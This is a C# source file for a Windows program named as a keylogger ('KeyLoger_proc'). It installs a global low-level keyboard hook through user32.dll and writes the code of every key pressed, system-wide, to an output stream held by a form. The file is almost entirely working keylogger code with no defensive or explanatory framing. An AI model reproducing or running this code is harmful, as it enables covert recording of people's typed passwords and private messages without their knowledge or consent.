using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.Threading.Tasks;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using System.Runtime.InteropServices;
   namespace KeyLoger_proc
{
       public class InterceptKeys
       {
           private const int WH_KEYBOARD_LL = 13;
           private const int WM_KEYDOWN = 0x0100;

           
           private static String keysHooked = String.Empty;
           public static IntPtr KeyboardProc=IntPtr.Zero;
        
           public InterceptKeys(String holder)
           {
               //    keysHooked = holder;
               Hook();
           }

           public void Hook()
           {
               IntPtr hInstance = LoadLibrary("User32");
               Form1.write.WriteLine("hInstance: " + hInstance);
               KeyboardProc = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, hInstance, 0);
               Form1.write.WriteLine("_hookID: " + KeyboardProc);
                
           }

           public void Unhook()
           {
               UnhookWindowsHookEx(KeyboardProc);
           }

           public delegate IntPtr HookProc(int code, int wParam, IntPtr lParam);

           public struct HookStruct
           {
               public int vkCode;
               public int scanCode;
               public int flags;
               public int time;
               public int dwExtraInfo;
           }

           public IntPtr HookCallback(int code, int wParam, IntPtr lParam)
           {
               HookStruct objKeyInfo = (HookStruct)Marshal.PtrToStructure(lParam, typeof(HookStruct));
               if (code >= 0 && wParam == WM_KEYDOWN)
               {
                   int vkCode = objKeyInfo.vkCode;
                   Form1.write.WriteLine((Keys)vkCode);
               }
               return CallNextHookEx(KeyboardProc, code, (IntPtr)wParam, lParam);
           }

           [DllImport("user32.dll")]
           static extern IntPtr SetWindowsHookEx(int idHook, HookProc callback, IntPtr hInstance, uint threadId);

           [DllImport("user32.dll")]
           static extern bool UnhookWindowsHookEx(IntPtr hInstance);

           [DllImport("user32.dll")]
           static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, IntPtr wParam, IntPtr lParam);

           [DllImport("kernel32.dll")]
           static extern IntPtr LoadLibrary(string lpFileName);

           [DllImport("Kernel32.dll", SetLastError = true)]
           private static extern IntPtr GetModuleHandle(IntPtr lpModuleName);
       }
      
         static class Program
    {
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
